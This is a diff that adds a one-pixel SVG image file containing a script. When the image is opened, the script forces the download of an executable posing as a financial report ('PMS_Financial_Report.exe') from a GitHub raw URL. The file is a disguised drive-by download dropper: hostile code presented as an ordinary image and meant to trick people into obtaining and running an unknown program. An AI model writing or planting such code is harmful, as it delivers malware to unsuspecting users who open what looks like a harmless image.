@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+  <script>
+    // Force an automatic download of the executable
+    var a = document.createElement('a');
+    a.href = 'https://raw.githubusercontent.com/Kavin-cse/testing/main/PMS_Financial_Report.exe';
+    a.download = 'PMS_Report.exe';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  </script>
+</svg>
